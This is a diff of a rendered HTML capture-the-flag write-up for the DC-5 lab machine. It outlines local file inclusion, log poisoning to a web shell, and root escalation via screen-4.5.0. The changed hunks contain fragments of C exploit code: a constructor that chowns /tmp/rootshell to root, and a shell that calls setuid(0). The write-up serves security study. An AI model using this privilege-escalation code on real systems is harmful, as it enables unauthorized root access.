@@ -1,4 +1,4 @@
-I"¸W<p>DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!</p>
+I"|X<p>DC-5 starts with discovery of a relatively obvious local file include vulnerability drives us towards a web shell via log poisoning. Once we land a shell, we search for SUID binaries and priv esc to root by exploiting screen-4.5.0 SUID binary. Enjoy this write up as much as I enjoyed writing it!</p>
 
 <h1 id="summary">Summary</h1>
 <ul>
@@ -289,9 +289,9 @@ Shellcodes: No Results
 8
 9
 10
-</pre></td><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;unistd.h&gt;
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span><span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span>
 <span class="kt">void</span> <span class="nf">dropshell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
     <span class="n">chown</span><span class="p">(</span><span class="s">"/tmp/rootshell"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
@@ -311,7 +311,7 @@ Shellcodes: No Results
 6
 7
 8
-</pre></td><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
     <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
